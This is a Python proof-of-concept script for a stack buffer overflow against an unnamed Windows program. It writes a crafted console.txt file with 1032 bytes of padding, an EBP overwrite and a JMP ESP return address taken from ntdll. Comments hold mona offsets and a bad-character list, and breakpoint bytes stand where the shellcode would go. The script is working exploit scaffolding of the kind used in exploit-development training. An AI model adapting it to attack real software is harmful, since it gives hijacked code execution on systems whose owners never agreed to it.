import struct

outputfile = "console.txt"
badchars = "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28"

padding = "A"*1032

# After using !mona pc 1500 and !mona findmsp
# Padding info in register and SEH alignment are below
# EIP contains normal pattern : 0x69423569 (offset 1036)
# ESP (0x0018ff1c) points at offset 1040 in normal pattern (length 210)
# EBP contains normal pattern : 0x42346942 (offset 1032)
# SEH record (nseh field) at 0x0018ffc4 overwritten with normal pattern : 0x336f4232 (offset 1208)

# Break point at 0x004012AF for debugging the bug
# POP EBP
# RET
ebp = "BBBB"

# JMP ESP search using !mona find -s "\xff\xe4"
# 0x7de9d07b (b+0x0002d07b)  : "\xff\xe4" |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: True, Rebase: False, SafeSEH: True, OS: True, v6.1.7600.16385 (C:\Windows\SysWOW64\ntdll.dll)

eip = struct.pack('L',0x7de9d07b)

# Code execution with \xCC (Breakpoint)
esp = "\xcc" * 168

# Don't trigger SEH unless  you turn it to a SEH exploit
nseh = "" #"EEEE"
seh = "" #"FFFF"

buffer = padding + ebp + eip + esp + nseh + seh

print("[+] Creating %s" % outputfile)
f = open(outputfile,'wb')
print("[+] Writing %d bytes to file" % len(buffer))
f.write(buffer)
print("[+] Done")
f.close()